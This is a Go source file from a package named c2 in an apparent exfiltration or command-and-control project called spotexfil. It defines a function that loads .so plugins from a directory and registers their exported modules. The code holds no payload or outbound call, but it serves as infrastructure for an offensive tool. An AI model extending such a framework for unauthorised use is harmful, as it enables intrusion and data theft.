//go:build linux || darwin

package c2

import (
	"fmt"
	"os"
	"path/filepath"
	"plugin"

	"github.com/sourcefrenchy/spotexfil/internal/modapi"
)

// LoadPlugins loads all .so plugin files from the given directory.
// Each plugin must export a symbol named "Module" of type *modapi.Module.
func LoadPlugins(dir string) error {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return err
	}
	for _, e := range entries {
		if filepath.Ext(e.Name()) != ".so" {
			continue
		}
		p, err := plugin.Open(filepath.Join(dir, e.Name()))
		if err != nil {
			fmt.Printf("[!] Plugin load failed: %s: %v\n", e.Name(), err)
			continue
		}
		sym, err := p.Lookup("Module")
		if err != nil {
			fmt.Printf("[!] Plugin missing Module symbol: %s\n", e.Name())
			continue
		}
		mod, ok := sym.(*modapi.Module)
		if !ok {
			fmt.Printf("[!] Plugin Module wrong type: %s\n", e.Name())
			continue
		}
		RegisterModule(*mod)
		fmt.Printf("[*] Loaded plugin: %s\n", (*mod).Name())
	}
	return nil
}
